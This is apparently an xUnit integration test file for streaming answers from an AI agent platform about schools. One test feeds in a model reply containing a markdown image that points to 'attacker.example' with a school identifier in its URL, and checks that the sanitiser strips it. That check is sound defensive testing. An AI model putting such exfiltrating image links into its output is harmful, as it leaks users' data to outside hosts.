using GovUK.Dfe.AI.Agents.Services.Interfaces;
using GovUK.Dfe.AI.Agents.Tests.Integration.Fakes;
using GovUK.Dfe.AI.Agents.Tools;
using GovUK.Dfe.AI.Agents.ValueObjects;
using Microsoft.Extensions.DependencyInjection;
using Xunit;

namespace GovUK.Dfe.AI.Agents.Tests.Integration;

/// <summary>A streamed run: the answer arrives as it's written, cleaned and safe, with the same checks and clean-up as any run.</summary>
public sealed partial class AgentPlatformEndToEndTests
{
    private static readonly AgentDefinition ChatAgent = new("chat-agent", "Chat");

    private async Task<(List<string> Pieces, AgentResult? Result)> StreamAsync(IAgentService agents, AgentDefinition agent, string? evidence = null)
    {
        var pieces = new List<string>();
        AgentResult? result = null;
        await foreach (var update in agents.RunStreamingAsync(agent, "Tell me about the school.", evidence, cancellationToken))
        {
            if (update.Text is { } text)
            {
                Assert.Null(result);   // the result comes last
                pieces.Add(text);
            }

            result = update.Result ?? result;
        }

        return (pieces, result);
    }

    [Fact]
    public async Task AStreamedAnswer_ArrivesInPieces_ThenTheResult()
    {
        WriteSystemPrompt("Chat", "You answer questions about schools.");
        _responses.Reply("chat-agent", FoundryResponses.Completed("r1", "The school was rated Good in 2025."));

        using var provider = Build();
        var (pieces, result) = await StreamAsync(provider.GetRequiredService<IAgentService>(), ChatAgent);

        Assert.True(pieces.Count > 1);
        Assert.Equal("The school was rated Good in 2025.", string.Concat(pieces));
        Assert.Equal(string.Concat(pieces), result!.Output);
        Assert.True(result.TotalTokens > 0);
        Assert.Equal(1, _responses.StreamedCalls);
    }

    [Fact]
    public async Task AnImageInAStreamedAnswer_NeverReachesTheApp_EvenWhenSplitAcrossPieces()
    {
        WriteSystemPrompt("Chat", "You answer questions about schools.");
        _responses.Reply("chat-agent", FoundryResponses.Completed("r1",
            "Rated Good ![chart](https://attacker.example/p?d=URN100000) see [GOV.UK](https://www.gov.uk) and [notes](files/a.md)."));

        using var provider = Build();
        var (pieces, result) = await StreamAsync(provider.GetRequiredService<IAgentService>(), ChatAgent);

        Assert.DoesNotContain(pieces, piece => piece.Contains("attacker", StringComparison.Ordinal));
        Assert.Equal("Rated Good chart see [GOV.UK](https://www.gov.uk) and notes.", string.Concat(pieces));
        Assert.Equal(string.Concat(pieces), result!.Output);
    }

    [Fact]
    public async Task AStreamedRun_StillRunsTools()
    {
        WriteSystemPrompt("Chat", "You answer questions about schools.");
        _responses.Reply("chat-agent",
            FoundryResponses.FunctionCall("r1", "call-1", "get_performance_data"),
            FoundryResponses.Completed("r2", "Attendance is 92%."));
        var tools = new FakeToolServer("get_performance_data") { Output = "attendance 92%" };

        using var provider = Build(services => services.AddSingleton(new AgentToolBinding("chat-agent", tools)));
        var (pieces, result) = await StreamAsync(provider.GetRequiredService<IAgentService>(),
            ChatAgent with { AllowedTools = ["get_performance_data"] });

        Assert.Equal("Attendance is 92%.", string.Concat(pieces));
        Assert.NotNull(result);
        Assert.Equal(2, _responses.StreamedCalls);   // the tool round and the answer
    }

    [Fact]
    public async Task AStreamedAnswerThatFailsACheck_ThrowsAtTheEnd_WithoutARetry()
    {
        WriteSystemPrompt("Chat", "You answer questions about schools.");
        _responses.Reply("chat-agent", FoundryResponses.Completed("r1", "Probably fine."));

        using var provider = Build();
        var ex = await Assert.ThrowsAsync<InvalidOperationException>(async () => await StreamAsync(provider.GetRequiredService<IAgentService>(),
            ChatAgent with { Validate = _ => "it must give a rating" }));

        Assert.Contains("it must give a rating", ex.ToString(), StringComparison.Ordinal);
        Assert.Single(_responses.CallsFor("chat-agent"));   // already shown, so not asked again
    }

    [Fact]
    public async Task StoppingEarly_EndsTheRun()
    {
        WriteSystemPrompt("Chat", "You answer questions about schools.");
        _responses.Reply("chat-agent", FoundryResponses.Completed("r1", "A long answer that the user stops reading part way through."));

        using var provider = Build();
        var updates = provider.GetRequiredService<IAgentService>().RunStreamingAsync(ChatAgent, "Tell me.", cancellationToken: cancellationToken);
        await using (var reader = updates.GetAsyncEnumerator(cancellationToken))
        {
            Assert.True(await reader.MoveNextAsync());
            Assert.NotNull(reader.Current.Text);
        }   // the user stops reading here

    }

    [Fact]
    public async Task OnlyTheStreamedRunStreams_NotRunsBeforeOrAfterIt()
    {
        WriteSystemPrompt("Chat", "You answer questions about schools.");
        _responses.Reply("chat-agent", FoundryResponses.Completed("r1", "Rated Good."));

        using var provider = Build();
        var agents = provider.GetRequiredService<IAgentService>();
        await agents.RunAsync(ChatAgent, "Tell me.", cancellationToken: cancellationToken);
        await StreamAsync(agents, ChatAgent);
        await agents.RunAsync(ChatAgent, "Tell me.", cancellationToken: cancellationToken);

        Assert.Equal(1, _responses.StreamedCalls);
    }
}
